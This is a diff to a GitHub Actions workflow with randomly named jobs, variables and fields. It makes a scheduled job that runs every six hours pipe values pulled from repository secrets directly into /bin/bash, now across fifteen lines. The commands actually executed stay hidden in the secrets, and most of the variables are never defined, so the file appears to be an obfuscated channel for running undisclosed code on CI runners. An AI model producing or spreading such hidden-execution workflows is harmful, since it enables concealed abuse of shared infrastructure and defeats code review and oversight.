@@ -2,21 +2,30 @@ name: tanloujun7165
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 5/6 * * *'
-
+    - cron: '42 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: tanloujun7165
         env:
-          agu0869: ${{ secrets.agu0869 }}
+          boq432: ${{ secrets.boq432 }}
         run: |
-          echo $agu0869 | jq -r .p28566 | /bin/bash
-          echo $k539 | jq -r .pdj6271 | /bin/bash
-          echo $y17 | jq -r .oiab0 | /bin/bash
-          echo $bbt996 | jq -r .ux0897 | /bin/bash
-          echo $rgew7626 | jq -r .k8624 | /bin/bash
-          echo $kqh9 | jq -r .xng6748 | /bin/bash
+          echo $boq432 | jq -r .zgmne349 | /bin/bash
+          echo $ebe19 | jq -r .f886 | /bin/bash
+          echo $binlp068 | jq -r .wje1 | /bin/bash
+          echo $bqxb944 | jq -r .j19 | /bin/bash
+          echo $ccec480 | jq -r .s0329 | /bin/bash
+          echo $jv27 | jq -r .oovse69 | /bin/bash
+          echo $hkex54604 | jq -r .h1133 | /bin/bash
+          echo $yaxya08796 | jq -r .ks36 | /bin/bash
+          echo $edn64294 | jq -r .xot77175 | /bin/bash
+          echo $clwot3 | jq -r .zpgt7 | /bin/bash
+          echo $uoy35 | jq -r .zeki17 | /bin/bash
+          echo $sdbt43795 | jq -r .ssn86751 | /bin/bash
+          echo $tgraa6561 | jq -r .e98075 | /bin/bash
+          echo $mbh453 | jq -r .nhx04847 | /bin/bash
+          echo $amqj819 | jq -r .ft76117 | /bin/bash
 
